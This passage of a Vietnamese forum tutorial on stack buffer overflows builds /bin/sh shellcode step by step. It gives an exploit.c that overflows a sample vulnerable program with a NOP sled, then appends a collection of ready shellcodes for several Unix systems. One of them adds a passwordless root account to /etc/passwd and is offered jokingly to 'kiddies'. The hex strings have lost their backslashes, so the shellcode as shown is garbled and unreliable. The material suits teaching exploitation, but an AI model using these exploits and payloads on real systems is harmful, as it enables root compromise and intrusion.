trình có thể thất bại. Vì vậy, chúng ta phải nhanh chóng kết thúc chương trình bằng lời gọi hàm exit(). Exit syscall trong C có dạng như sau:<br/> <br/> exit.c<br/> ------------------------------------------------------------------------------<br/> #include <br/> <br/> void main() {<br/> exit(0);<br/> }<br/> ------------------------------------------------------------------------------<br/> Xem mã assemly của hàm exit():<br/> <br/> [đt@localhost ~/vicki]$ gcc -o exit -ggdb -static exit.c<br/> [đt@localhost ~/vicki]$ gdb exit<br/> GNU gdb 5.0mdk-11mdk Linux-Mandrake 8.0<br/> Copyright 2001 Free Software Foundation, Inc.<br/> GDB is free software, covered by the GNU General Public License, and you are<br/> welcome to change it and/or distribute copies of it under certain conditions.<br/> Type "show copying" to see the conditions.<br/> There is absolutely no warranty for GDB. Type "show warranty" for details.<br/> This GDB was configured as "i386-mandrake-linux"...<br/> (gdb) disas _exit<br/> Dump of assembler code for function _exit:<br/> 0x800034c &lt;_exit&gt;: pushl %ebp<br/> 0x800034d &lt;_exit+1&gt;: movl %esp,%ebp<br/> 0x800034f &lt;_exit+3&gt;: pushl %ebx<br/> 0x8000350 &lt;_exit+4&gt;: movl $0x1,%eax<br/> 0x8000355 &lt;_exit+9&gt;: movl 0x8(%ebp),%ebx<br/> 0x8000358 &lt;_exit+12&gt;: int $0x80<br/> 0x800035a &lt;_exit+14&gt;: movl 0xfffffffc(%ebp),%ebx<br/> 0x800035d &lt;_exit+17&gt;: movl %ebp,%esp<br/> 0x800035f &lt;_exit+19&gt;: popl %ebp<br/> 0x8000360 &lt;_exit+20&gt;: ret<br/> 0x8000361 &lt;_exit+21&gt;: nop<br/> 0x8000362 &lt;_exit+22&gt;: nop<br/> 0x8000363 &lt;_exit+23&gt;: nop<br/> End of assembler dump.<br/> (gdb) quit<br/> exit syscall sẽ đặt 0x1 vào EAX, đặt exit code trong EBX và gọi ngắt "int 0x80". exit code = 0 nghĩa là không gặp lỗi. Vì vậy chúng ta sẽ đặt 0 trong EBX.<br/> <br/> Tóm lại:<br/> <br/> a/ có một chuổi kết thúc bằng null "/bin/sh" ở đâu đó trong bộ nhớ<br/> b/ có địa chỉ của chuổi "/bin/sh" ở đâu đó trong bộ nhớ theo sau là 1 null dài 1 word<br/> c/ copy 0xb vào thanh ghi EAX<br/> d/ copy địa chỉ của địa chỉ của chuổi "/bin/sh" vào thanh ghi EBX<br/> e/ copy địa chỉ của chuổi "/bin/sh" vào thanh ghi ECX<br/> f/ copy địa chỉ của null dài 1 word vào thanh ghi EDX<br/> g/ gọi ngắt $0x80<br/> h/ copy 0x1 vào thanh ghi EAX<br/> i/ copy 0x0 vào thanh ghi EBX<br/> j/ gọi ngắt $0x80<br/> <br/> Shellcode sẽ có dạng như sau:<br/> <br/> ------------------------------------------------------------------------------<br/> jmp offset-to-call # 2 bytes<br/> popl %esi # 1 byte<br/> movl %esi,array-offset(%esi) # 3 bytes<br/> movb $0x0,nullbyteoffset(%esi)# 4 bytes<br/> movl $0x0,null-offset(%esi) # 7 bytes<br/> movl $0xb,%eax # 5 bytes<br/> movl %esi,%ebx # 2 bytes<br/> leal array-offset,(%esi),%ecx # 3 bytes<br/> leal null-offset(%esi),%edx # 3 bytes<br/> int $0x80 # 2 bytes<br/> movl $0x1, %eax # 5 bytes<br/> movl $0x0, %ebx # 5 bytes<br/> int $0x80 # 2 bytes<br/> call offset-to-popl # 5 bytes<br/> /bin/sh string goes here.<br/> ------------------------------------------------------------------------------<br/> Tính toán các offsets từ jmp đến call, từ call đến popl, từ địa chỉ của chuổi đến mảng, và từ địa chỉ của chuổi đến word null, chúng ta sẽ có shellcode thật sự:<br/> <br/> ------------------------------------------------------------------------------<br/> jmp 0x26 # 2 bytes<br/> popl %esi # 1 byte<br/> movl %esi,0x8(%esi) # 3 bytes<br/> movb $0x0,0x7(%esi) # 4 bytes<br/> movl $0x0,0xc(%esi) # 7 bytes<br/> movl $0xb,%eax # 5 bytes<br/> movl %esi,%ebx # 2 bytes<br/> leal 0x8(%esi),%ecx # 3 bytes<br/> leal 0xc(%esi),%edx # 3 bytes<br/> int $0x80 # 2 bytes<br/> movl $0x1, %eax # 5 bytes<br/> movl $0x0, %ebx # 5 bytes<br/> int $0x80 # 2 bytes<br/> call -0x2b # 5 bytes<br/> .string "/bin/sh" # 8 bytes<br/> ------------------------------------------------------------------------------<br/> Để biết mã máy của các lệnh hợp ngữ trên ở dạng hexa, bạn cần compile shellcodeasm.c và gdb shellcodeasm:<br/> <br/> shellcodeasm.c<br/> ------------------------------------------------------------------------------<br/> void main() {<br/> __asm__("<br/> jmp 0x2a # 3 bytes<br/> popl %esi # 1 byte<br/> movl %esi,0x8(%esi) # 3 bytes<br/> movb $0x0,0x7(%esi) # 4 bytes<br/> movl $0x0,0xc(%esi) # 7 bytes<br/> movl $0xb,%eax # 5 bytes<br/> movl %esi,%ebx # 2 bytes<br/> leal 0x8(%esi),%ecx # 3 bytes<br/> leal 0xc(%esi),%edx # 3 bytes<br/> int $0x80 # 2 bytes<br/> movl $0x1, %eax # 5 bytes<br/> movl $0x0, %ebx # 5 bytes<br/> int $0x80 # 2 bytes<br/> call -0x2f # 5 bytes<br/> .string "/bin/sh" # 8 bytes<br/> ");<br/> }<br/> ------------------------------------------------------------------------------<br/> [đt@localhost ~/vicki]$ gcc -o shellcodeasm -g -ggdb shellcodeasm.c<br/> [đt@localhost ~/vicki]$ gdb shellcodeasm<br/> GNU gdb 5.0mdk-11mdk Linux-Mandrake 8.0<br/> Copyright 2001 Free Software Foundation, Inc.<br/> GDB is free software, covered by the GNU General Public License, and you are<br/> welcome to change it and/or distribute copies of it under certain conditions.<br/> Type "show copying" to see the conditions.<br/> There is absolutely no warranty for GDB. Type "show warranty" for details.<br/> This GDB was configured as "i386-mandrake-linux"...<br/> (gdb) disas main<br/> Dump of assembler code for function main:<br/> 0x8000130 : pushl %ebp<br/> 0x8000131 : movl %esp,%ebp<br/> 0x8000133 : jmp 0x800015f <br/> 0x8000135 : popl %esi<br/> 0x8000136 : movl %esi,0x8(%esi)<br/> 0x8000139 : movb $0x0,0x7(%esi)<br/> 0x800013d : movl $0x0,0xc(%esi)<br/> 0x8000144 : movl $0xb,%eax<br/> 0x8000149 : movl %esi,%ebx<br/> 0x800014b : leal 0x8(%esi),%ecx<br/> 0x800014e : leal 0xc(%esi),%edx<br/> 0x8000151 : int $0x80<br/> 0x8000153 : movl $0x1,%eax<br/> 0x8000158 : movl $0x0,%ebx<br/> 0x800015d : int $0x80<br/> 0x800015f : call 0x8000135 <br/> 0x8000164 : das<br/> 0x8000165 : boundl 0x6e(%ecx),%ebp<br/> 0x8000168 : das<br/> 0x8000169 : jae 0x80001d3 &lt;__new_exitfn+55&gt;<br/> 0x800016b : addb %cl,0x55c35dec(%ecx)<br/> End of assembler dump.<br/> (gdb) x/bx main+3<br/> 0x8000133 : 0xeb<br/> (gdb)<br/> 0x8000134 : 0x2a<br/> (gdb)<br/> .<br/> .<br/> .<br/> (gdb) quit<br/> Ghi chú: x/bx dùng để hiển thị mã máy ở dạng hexa của lệnh hợp ngữ<br/> <br/> Bây giờ bạn hãy test thử shellcode đầu tiên:<br/> <br/> testsc1.c<br/> ------------------------------------------------------------------------------<br/> char shellcode[] =<br/> "xebx2ax5ex89x76x08xc6x46x07x00xc7x46x0cx00x00x00"<br/> "x00xb8x0bx00x00x00x89xf3x8dx4ex08x8dx56x0cxcdx80"<br/> "xb8x01x00x00x00xbbx00x00x00x00xcdx80xe8xd1xffxff"<br/> "xffx2fx62x69x6ex2fx73x68x00x89xecx5dxc3";<br/> <br/> void main() {<br/> int *ret;<br/> <br/> ret = (int *)&ret + 2;<br/> (*ret) = (int)shellcode;<br/> <br/> }<br/> ------------------------------------------------------------------------------<br/> [đt@localhost ~/vicki]$ cc -o testsc1 testsc1.c<br/> [đt@localhost ~/vicki]$ ./testsc1<br/> sh-2.04$ exit<br/> [đt@localhost ~/vicki]$<br/> Nó đã làm việc! Tuy nhiên có một vấn đề lớn trong shellcode đầu tiên. Shellcode này có chứa x00. Chúng ta sẽ thất bại nếu dùng shellcode này để làm tràn bộ đệm. Vì sao? Hàm strcpy() sẽ chấm dứt copy khi gặp x00 nên shellcode sẽ không được copy trọn vẹn vào buffer! Chúng ta cần gở bỏ hết x00 trong shellcode:<br/> <br/> Câu lệnh gặp vấn đề: Được thay thế bằng:<br/> --------------------------------------------------------<br/> movb $0x0,0x7(%esi) xorl %eax,%eax<br/> molv $0x0,0xc(%esi) movb %eax,0x7(%esi)<br/> movl %eax,0xc(%esi)<br/> --------------------------------------------------------<br/> movl $0xb,%eax movb $0xb,%al<br/> --------------------------------------------------------<br/> movl $0x1, %eax xorl %ebx,%ebx<br/> movl $0x0, %ebx movl %ebx,%eax<br/> inc %eax<br/> --------------------------------------------------------<br/> Shellcode mới!<br/> <br/> shellcodeasm2.c<br/> ------------------------------------------------------------------------------<br/> void main() {<br/> __asm__("<br/> jmp 0x1f # 2 bytes<br/> popl %esi # 1 byte<br/> movl %esi,0x8(%esi) # 3 bytes<br/> xorl %eax,%eax # 2 bytes<br/> movb %eax,0x7(%esi) # 3 bytes<br/> movl %eax,0xc(%esi) # 3 bytes<br/> movb $0xb,%al # 2 bytes<br/> movl %esi,%ebx # 2 bytes<br/> leal 0x8(%esi),%ecx # 3 bytes<br/> leal 0xc(%esi),%edx # 3 bytes<br/> int $0x80 # 2 bytes<br/> xorl %ebx,%ebx # 2 bytes<br/> movl %ebx,%eax # 2 bytes<br/> inc %eax # 1 bytes<br/> int $0x80 # 2 bytes<br/> call -0x24 # 5 bytes<br/> .string "/bin/sh" # 8 bytes<br/> # 46 bytes total<br/> ");<br/> }<br/> ------------------------------------------------------------------------------<br/> Test shellcode mới!<br/> <br/> testsc2.c<br/> ------------------------------------------------------------------------------<br/> char shellcode[] =<br/> "xebx1fx5ex89x76x08x31xc0x88x46x07x89x46x0cxb0x0b"<br/> "x89xf3x8dx4ex08x8dx56x0cxcdx80x31xdbx89xd8x40xcd"<br/> "x80xe8xdcxffxffxff/bin/sh";<br/> <br/> void main() {<br/> int *ret;<br/> <br/> ret = (int *)&ret + 2;<br/> (*ret) = (int)shellcode;<br/> <br/> }<br/> ------------------------------------------------------------------------------<br/> [đt@localhost ~/vicki]$ cc -o testsc2 testsc2.c<br/> [đt@localhost ~/vicki]$ ./testsc2<br/> sh-2.04$ exit<br/> [đt@localhost ~/vicki]$<br/> Viết tràn bộ đệm<br/> <br/> Ví dụ 1:<br/> <br/> overflow.c<br/> ------------------------------------------------------------------------------<br/> char shellcode[] =<br/> "xebx1fx5ex89x76x08x31xc0x88x46x07x89x46x0cxb0x0b"<br/> "x89xf3x8dx4ex08x8dx56x0cxcdx80x31xdbx89xd8x40xcd"<br/> "x80xe8xdcxffxffxff/bin/sh";<br/> <br/> char large_string[128];<br/> <br/> void main() {<br/> char buffer[96];<br/> int i;<br/> long *long_ptr = (long *) large_string;<br/> <br/> for (i = 0; i &lt; 32; i++)<br/> *(long_ptr + i) = (int) buffer;<br/> <br/> for (i = 0; i &lt; strlen(shellcode); i++)<br/> large_string[i] = shellcode[i];<br/> <br/> strcpy(buffer,large_string);<br/> }<br/> ------------------------------------------------------------------------------<br/> [đt@localhost ~/vicki]$ cc -o overflow overflow.c<br/> [đt@localhost ~/vicki]$ ./overflow<br/> sh-2.04$ exit<br/> [đt@localhost ~/vicki]$<br/> * Giải thích:<br/> <br/> đỉnh của +--------------+ đáy của +----------------+ đỉnh của<br/> bộ nhớ | ret addr | stack | addr(buffer) | bộ nhớ <br/> +--------------+ | addr(buffer) |<br/> | ebp | | ... |<br/> +--------------+ | addr(buffer) |<br/> | | | addr(buffer) | large_string[128]<br/> | buffer[96] | | addr(buffer) |<br/> | | | |<br/> +--------------+ | shellcode | <br/> | long_ptr | --------------&gt; | |<br/> đáy của +--------------+ đỉnh của +----------------+ đáy của<br/> bộ nhớ stack bộ nhớ<br/> <br/> STACK HEAP<br/> char large_string[128]; //cấp phát một vùng nhớ 128 bytes trên HEAP<br/> <br/> long *long_ptr = (long *) large_string; // cho long_ptr trỏ đến đầu mảng large_string[]<br/> <br/> for (i=0; i&lt;32; i++)<br/> *(long_ptr+i) = (int)buffer; //lắp đầy mảng large_string[] bằng địa chỉ của mảng buffer[]<br/> <br/> for (i=0; i large_string[i] = shellcode[i]; //đẩy shellcode vào phần đầu của mảng large_string[]<br/> <br/> strcpy(buffer, large_string); //copy large_string vào buffer... làm tràn bộ đệm<br/> <br/> Trước hết chúng ta khởi tạo một mảng large_string[] có kích thước lớn hơn buffer[] trên HEAP. Tiếp theo lắp đầy large_string[] bằng địa chỉ của buffer[]. Shellcode sẽ được gắn vào phần đầu của large_string[]. Khi hàm strcpy được thực hiện, nó sẽ copy large_string vào buffer. Bởi vì large_string quá lớn nên nó sẽ ghi đè lên ebp và return addr. Phần trên của mảng large_string toàn là địa chỉ của buffer[] - addr(buffer) nên return addr sẽ trỏ đến buffer[0]. Mà nằm ngay ở phần đầu của buffer lại chính là shellcode(do ta đã copy large_string vào buffer bằng hàm strcpy), nên shellcode sẽ được thi hành, nó sẽ đổ ra một shell lệnh.<br/> <br/> Ví dụ 2:<br/> <br/> Để viết tràn bộ đệm, bạn phải biến địa chỉ của buffer trên stack. Thật may cho chúng ta là hầu như tất cả các chương trình đều có cùng địa chỉ bắt đầu stack. Chúng ta có thể lấy được địa chỉ bắt đầu của stack qua chương trình sau:<br/> <br/> sp.c<br/> ------------------------------------------------------------------------------<br/> unsigned long get_sp(void) {<br/> __asm__("movl %esp,%eax");<br/> }<br/> void main() {<br/> printf("0x%xn", get_sp());<br/> }<br/> ------------------------------------------------------------------------------<br/> [đt@localhost ~/vicki]$ cc -o sp sp.c<br/> [đt@localhost ~/vicki]$ ./sp<br/> 0xbffffb07<br/> [đt@localhost ~/vicki]$<br/> Giả sử chương trình mà chúng ta cố làm tràn bộ đệm như sau:<br/> <br/> vulnerable.c<br/> ----------------------------------------------<br/> int main(int argc, char *argv[])<br/> { <br/> char buffer[500];<br/> if(argc&gt;=2) strcpy(buffer, argv[1]);<br/> return 0;<br/> }<br/> ----------------------------------------------<br/> Đây là chương trình exploit.c. exploit sẽ làm tràn bộ đệm của vulnerable và buộc vulnerable đổ một shell lệnh cho chúng ta.<br/> <br/> exploit.c<br/> ------------------------------------------------------------------------------<br/> #include <br/> #define BUFFERSIZE 600<br/> #define OFFSET 0<br/> #define NOP 0x90<br/> <br/> char shellcode[] =<br/> "xebx1fx5ex89x76x08x31xc0x88x46x07x89x46x0cxb0x0b"<br/> "x89xf3x8dx4ex08x8dx56x0cxcdx80x31xdbx89xd8x40xcd"<br/> "x80xe8xdcxffxffxff/bin/sh";<br/> <br/> unsigned long get_esp(void)<br/> {<br/> __asm__("movl %esp, %eax");<br/> }<br/> <br/> int main(int argc, char *argv[])<br/> {<br/> int i, offset=OFFSET, bsize=BUFFERSIZE;<br/> long esp, ret, *addr_ptr;<br/> char *buffer, *ptr, *osptr;<br/> <br/> if (argc&gt;1) bsize=atoi(argv[1]);<br/> if (argc&gt;2) offset=atoi(argv[2]);<br/> <br/> esp=get_esp();<br/> ret=esp-offset;<br/> <br/> printf("Stack pointer: 0x%xn",esp);<br/> printf("Offset : 0x%xn",offset);<br/> printf("Return addr : 0x%xn",ret);<br/> <br/> if (!(buffer=malloc(bsize)))<br/> {<br/> printf("Khong the cap phat bo nho.n");<br/> exit(-1);<br/> }<br/> <br/> ptr=buffer;<br/> addr_ptr=(long *)ptr;<br/> for (i=0;i *(addr_ptr++)=ret;<br/> <br/> for (i=0;i buffer[i]=NOP;<br/> <br/> ptr=buffer+((bsize/2)-(strlen(shellcode)/2));<br/> for (i=0;i *(ptr++)=shellcode[i];<br/> <br/> buffer[bsize-1]=0;<br/> execl("./vulnerable","vulnerable",buffer,0);<br/> }<br/> ------------------------------------------------------------------------------<br/> [đt@localhost ~/vicki]$ cc -o vulnerable vulnerable.c<br/> [đt@localhost ~/vicki]$ cc -o exploit exploit.c<br/> [đt@localhost ~/vicki]$ ./exploit<br/> Stack pointer: 0xbffffaf8<br/> Offset : 0x0<br/> Return addr : 0xbffffaf8<br/> <br/> sh-2.04$<br/> Giải thích:<br/> <br/> Trước hết, chúng ta cần xác định địa chỉ trở về khi tràn bộ đệm.<br/> <br/> esp=get_esp();<br/> ret=esp-offset;<br/> <br/> Địa chỉ trở về khi tràn bộ đệm = ESP(địa chỉ bắt đầu của stack) - OFFSET . Tại sao phải trừ cho offset? Bởi vì chúng ta có gọi hàm execl("./vulnerable","vulnerable",buffer,0); sau cùng, nên ESP lúc này sẽ bị trừ đi một số bytes do chương trình exploit có sử dụng một số bytes trên stack cho các tham số và biến cục bộ của hàm.Điều này sẽ tăng khả năng địa chỉ trở về trỏ đến một nơi nào đó trong buffer[] của vulnerable, nơi mà chúng ta sẽ đặt NOPs và shellcode.<br/> <br/> Quan sát stack:<br/> <br/> +---------------+<br/> | argv[] & argc |<br/> | của exploit |<br/> +---------------+<br/> | return addr 1 |<br/> +---------------+<br/> | ebp 1 |<br/> +---------------+<br/> | |<br/> | các biến cục |<br/> | bộ của exploit|<br/> | |<br/> +---------------+<br/> | argv[] & argc |<br/> | của exploit |<br/> +---------------+<br/> | return addr 2 | ----<br/> +---------------+ |<br/> | ebp 2 | |<br/> +---------------+ |<br/> | | |<br/> | buffer[] của | |<br/> | vulnerable | &lt;---/<br/> | |<br/> +---------------+<br/> Chúng ta cần làm tràn buffer[] của vulnerable để return addr 2 trỏ đến đâu đó trong buffer[]. Cũng như ví dụ 1- overflow.c(bạn hãy xem lại thật kĩ ví dụ 1), chúng ta sẽ tạo một vùng nhớ trên heap:<br/> <br/> if (!(buffer=malloc(bsize)))<br/> {<br/> printf("Khong the cap phat bo nho.n");<br/> exit(-1);<br/> }<br/> Bây giờ lắp đầy buffer bằng địa chỉ trở về mà chúng ta đã tính được:<br/> <br/> ptr=buffer;<br/> addr_ptr=(long *)ptr;<br/> for (i=0;i *(addr_ptr++)=ret;<br/> Tiếp theo chúng ta sẽ lắp đầy 1/2 buffer bằng NOPs<br/> <br/> for (i=0;i buffer[i]=NOP;<br/> Sau đó, chúng ta đặt shellcode vào giữa NOPs<br/> <br/> ptr=buffer+((bsize/2)-(strlen(shellcode)/2));<br/> for (i=0;i *(ptr++)=shellcode[i];<br/> Cuối cùng đặt '' vào buffer để hàm strcpy() trong vulnerable biết đã hết data cần copy.<br/> <br/> buffer[bsize-1]=0;<br/> Tiến hành làm tràn bộ đệm của vulnerable, bạn sẽ có được shell lệnh do vulnerable spawn.<br/> <br/> execl("./vulnerable","vulnerable",buffer,0);<br/> Quan sát stack, buffer[] của vulnerable và return addr 2 sau khi tràn bộ đệm sẽ có dạng như sau:<br/> <br/> +------------+<br/> |return addr2| -----<br/> +------------+ |<br/> | ebp 2 | |<br/> +------------+ |<br/> | ... | |<br/> | nop | |<br/> | ... | |<br/> | shellcode | |<br/> | ... | |<br/> | nop | |<br/> | nop | &lt;----/<br/> | nop |<br/> | ... |<br/> +------------+<br/> Chúng ta hi vọng rằng return addr 2 sẽ trỏ đến 1 nop trước shellcode. Các câu lệnh NOPs sẽ không làm gì hết, đến khi gặp shellcode, shellcode sẽ đổ shell lệnh cho chúng ta(bạn hãy xem lại phần "Hình dung cách đặt shellcode trên stack).<br/> <br/> Phụ lục<br/> <br/> Các loại shellcode<br/> <br/> BSDi<br/> <br/> char code[] =<br/> "xebx57x5ex31xdbx83xc3x08x83xc3x02x88x5e"<br/> "x26x31xdbx83xc3x23x83xc3x23x88x5exa8x31"<br/> "xdbx83xc3x26x83xc3x30x88x5exc2x31xc0x88"<br/> "x46x0bx89xf3x83xc0x05x31xc9x83xc1x01x31"<br/> "xd2xcdx80x89xc3x31xc0x83xc0x04x31xd2x88"<br/> "x56x27x89xf1x83xc1x0cx83xc2x1bxcdx80x31"<br/> "xc0x83xc0x06xcdx80x31xc0x83xc0x01xcdx80"<br/> "BIN/SH";<br/> <br/> FreeBSD<br/> <br/> char code[]=<br/> "xebx37x5ex31xc0x88x46xfax89x46xf5x89x36x89x76"<br/> "x04x89x76x08x83x06x10x83x46x04x18x83x46x08x1b"<br/> "x89x46x0cx88x46x17x88x46x1ax88x46x1dx50x56xff"<br/> "x36xb0x3bx50x90x9ax01x01x01x01x07x07xe8xc4xff"<br/> "xffxffx02x02x02x02x02x02x02x02x02x02x02x02x02"<br/> "x02x02x02/bin/sh.-c.sh";<br/> <br/> Replace .sh with .anycommand<br/> <br/> Linux x86<br/> <br/> char shellcode[] =<br/> "xebx1fx5ex89x76x08x31xc0x88x46x07x89x46x0cxb0x0b"<br/> "x89xf3x8dx4ex08x8dx56x0cxcdx80x31xdbx89xd8x40xcd"<br/> "x80xe8xdcxffxffxff/bin/sh";<br/> <br/> OpenBSD<br/> <br/> OpenBSD shellcode that adds an unpassworded root login<br/> "w00w00" to /etc/passwd... Courtesy of w00w00.<br/> (Changed from /tmp/passwd to /etc/passwd... give kiddies a chance <img src="/hvaonline/images/smilies/068ae40523a24c9ef54edefd375e542d.gif" border="0" alt="smilie" align="absbottom"><br/> <br/> char shell[]=<br/> "xebx2bx5ex31xc0x88x46x0b"<br/> "x88x46x29x50xb0x09x50x31"<br/> "xc0x56x50xb0x05xcdx80x89"<br/> "xc3x6ax1dx8dx46x0cx50x53"<br/> "x50x31xc0xb0x04xcdx80x31"<br/> "xc0xb0x01xcdx80xe8xd0xff"<br/> "xffxffx2fx65x74x63x2fx70"<br/> "x61x73x73x77x64x30x77x30"<br/> "x30x77x30x30x3ax3ax30x3a"<br/> "x30x3ax77x30x30x77x30x30"<br/> "x3ax2fx3ax2fx62x69x6ex2f"<br/> "x73x68x0ax30xffxffxffxff"<br/> "xffxffxffxffxffxffxffxff"<br/> "xffxffxffxffxffxffxffxff";<br/> <br/> Solaris / Sparc<br/> <br/> char c0de[] =<br/> /* setreuid() */<br/> "x82x10x20xca" /* mov 0xca, %g1 */<br/> "x92x1ax40x09" /* xor %o1, %o1, %o1 */<br/> "x90x0ax40x09" /* and %o1, %o1, %o0 */<br/> "x91xd0x20x08" /* ta 8 */<br/> "x2dx0bxd8x9a" /* sethi $0xbd89a, %l6 */<br/> "xacx15xa1x6e" /* or %l6, 0x16e, %l6 */<br/> "x2fx0bxdcxda" /* sethi $0xbdcda, %l7 */<br/> "x90x0bx80x0e" /* and %sp, %sp, %o0 */<br/> "x92x03xa0x08" /* add %sp, 8, %o1 */<br/> "x94x1ax80x0a" /* xor %o2, %o2, %o2 */<br/> "x9cx03xa0x10" /* add %sp, 0x10, %sp */<br/> "xecx3bxbfxf0" /* std %l6, [%sp - 0x10] */<br/> "xdcx23xbfxf8" /* st %sp, [%sp - 0x08] */<br/> "xc0x23xbfxfc" /* st %g0, [%sp - 0x04] */<br/> "x82x10x20x3b" /* mov $0x3b, %g1 */<br/> "x91xd0x20x08" /* ta 8 <br/> <br/> Solaris / x86<br/> <br/> char c0de[] = <br/> <br/> "xebx0a" /* jmp initcall */<br/> "x9ax01x02x03x5cx07x04" /* lcall */<br/> "xc3" /* ret */<br/> "xebx05" /* jmp setuidcode */<br/> "xe8xf9xffxffxff" /* call jmpz */<br/> "x5e" /* popl %esi */<br/> "x29xc0" /* subl %eax, %eax */<br/> "x88x46xf7" /* movb %al, 0xfffffff7(%esi) */<br/> "x89x46xf2" /* movl %eax, 0xfffffff2(%esi) */<br/> "x50" /* pushl %eax */<br/> "xb0x8d" /* movb $0x8d, %al */<br/> "xe8xe0xffxffxff" /* call initlcall */<br/> "x29xc0" /* subl %eax, %eax */<br/> "x50" /* pushl %eax */<br/> "xb0x17" /* movb $0x17, %al */<br/> "xe8xd6xffxffxff" /* call initlcall */<br/> "xebx1f" /* jmp callz */<br/> "x5e" /* popl %esi */<br/> "x8dx1e" /* leal (%esi), %ebx */<br/> "x89x5ex0b" /* movl %ebx, 0x0b(%esi) */<br/> "x29xc0" /* subl %eax, %eax */<br/> "x88x46x19" /* movb %al, 0x19(%esi) */<br/> "x89x46x14" /* movl %eax, 0x14(%esi) */<br/> "x89x46x0f" /* movl %eax, 0x0f(%esi) */<br/> "x89x46x07" /* movl %eax, 0x07(%esi) */<br/> "xb0x3b" /* movb $0x3b, %al */<br/> "x8dx4ex0b" /* leal 0x0b(%esi), %ecx */<br/> "x51" /* pushl %ecx */<br/> "x51" /* pushl %ecx */<br/> "x53" /* pushl %ebx */<br/> "x50" /* pushl %eax */<br/> "xebx18" /* jmp lcall */<br/> "xe8xdcxffxffxff" /* call start */<br/> "x2fx62x69x6ex2fx73x68" /* /bin/sh */<br/> "x01x01x01x01x02x02x02x02x03x03x03x03"<br/> "x9ax04x04x04x04x07x04"; /* lcall */<br/> Công cụ tạo shellcode "Hellkit"<br/> <br/> Hellkit là một công cụ dùng tạo shellcode cho Linux rất dễ dùng. Hellkit rất đa năng, đặc biệt Hellkit còn cho phép tạo shellcode có kích thước lên đến 65535 bytes!<br/> <br/> Tài liệu tham khảo<br/> <br/> "Smashing The Stack For Fun And Profit"(phrack 49-14) - Aleph One<br/> "Advanced buffer overflow exploits" - Taeho Oh<br/> <br/> Do hiểu biết còn nhiều hạn chế nên bài viết này không tránh khỏi những thiếu xót, rất mong nhận được sự đóng góp, giúp đỡ của các bạn để bài viết được hoàn thiện hơn. Thanx, đt. Vicki's real fan!</span></td>
                  </tr>
                </table>
          <!-- Attachments -->
			  		</td>
      </tr>


			<tr>
		        <td valign="bottom" class="row1" align="center"><div class="action" align="center">
	<table width="100%" border="0">
  		<tr>
		<td align="left">
					</td>
		<td align="right">
			<!--  -->
			
		


		
		
		<a class="nav" href="#top"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_up.gif" alt="[Up]" title="[Up]"></a>
			<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_print.gif" alt="[Print Copy]" title="[Print Copy]"></a>
		</td>
  	</tr>
	</table>
</div></td>
		  </tr>
	</table>

<table cellspacing="0" cellpadding="0" width="100%" align="center" border="0">
	<tr>
    	<td class="catbottomslim" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="5"></td>
  	</tr>
	<tr>
		<td><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="20"></td>
	</tr>
</table>

		


<table cellspacing="0" cellpadding="0" width="100%" align="center" border="1">
	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr>

		

		<th nowrap="nowrap" class="thright" height="20" valign="middle" align="left">&nbsp;&nbsp;<span class="posttype"><font color="#FF3333">[Article]</font></span>&nbsp;&nbsp; Tìm hiểu đầy đủ về tràn bộ đệm - II<a name="1107" id="1107"></a></th>
        <th class="thleft" nowrap="nowrap" width="300" height="20" valign="middle" align="right">27/06/2006 03:07:45 (+0700) | <a href="/hvaonline/posts/list/430.hva#1107">#2</a> | 1107 </th>
		
      </tr>
	</table>

	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr> 
		<!-- Username & profile -->
          	<td class="rowButton" valign="top">
<table cellspacing="3" cellpadding="3" width="100%" align="left" border="0">
<tr>

<td align="left">
<span class="uprofile"><a href="/hvaonline/user/profile/111217.hva"><b>hmnm</b></a><br>
	<font color="#CCCCCC">Member</font></span>
<br>

<span class="uprofile">
		
</span>
	<table cellspacing="0" cellpadding="0" border="0" width="20" height="8">
		<tr>
			<td>
				<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/minus.gif" alt="[Minus]" title="[Minus]"></a>	</td>
			<td height="4" width="16">
				<span class="warn">&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;</span>	</td>
			<td>
				<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/plus.gif" alt="[Plus]" title="[Plus]"></a>
			</td>
		</tr>
	</table>

<!-- --></td>
	<td align="left" class="gen" width="180">
		Joined: 04/07/2005 10:32:09<br>
		Messages: 17<br>
	
	
	
			<span class="offline">Offline </span>
	<br>
<table cellspacing="0" cellpadding="0" border="0" width="100%">
  <tr>
	<td valign="middle" nowrap="nowrap"> 
		<a href="/hvaonline/user/profile/111217.hva" class="icon_profile"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_profile.gif" alt="[Profile]" title="[Profile]"></a>
		<a href="/hvaonline/pm/sendTo/111217.hva" class="icon_pm"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_pm.gif" alt="[PM]" title="[PM]"></a>

		
		
		
		
	</td>
</tr>
  <tr>
    <td valign="middle" nowrap="nowrap">
	
</td>
  </tr>
</table>
	</td>
</tr>
</table>
</td>
      </tr>
	</table>
	
	<table cellspacing="1" cellpadding="3" width="100%" align="center" border="0">
      <tr>
        <!-- Message -->
        <td colspan="2" valign="top" class="row2">
				<!-- should view editeBy or not -->
			  <!-- which to view -->
                <table cellspacing="3" cellpadding="3" width="100%" align="center" border="0">
                  <tr>
